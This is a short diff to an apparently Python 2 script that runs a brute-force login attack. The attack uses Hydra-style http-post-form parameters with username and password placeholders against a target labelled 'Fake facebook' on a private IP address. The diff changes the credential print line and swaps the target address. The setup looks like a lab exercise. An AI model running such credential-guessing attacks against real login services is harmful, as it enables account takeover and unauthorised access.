@@ -46,7 +46,7 @@ def attack(moduleB, website_info):
     if successful(output):
         print('success')
         username, password = grab_success(output, port, service_mode)
-        print'credentials:', username, password
+        print 'credentials for {}:'.format(website_info.website_name), username, password
     else:
         print('failure')
 
@@ -57,7 +57,7 @@ if __name__ == '__main__':
     
     # From the database of things
     name = 'Fake facebook'
-    ip_address = '192.168.2.65'
+    ip_address = '10.202.208.81'
     port = '8080'
     service_mode = 'http-post-form'
     address_and_details = '/login:username=^USER^&password=^PASS^:S=Hello World!'
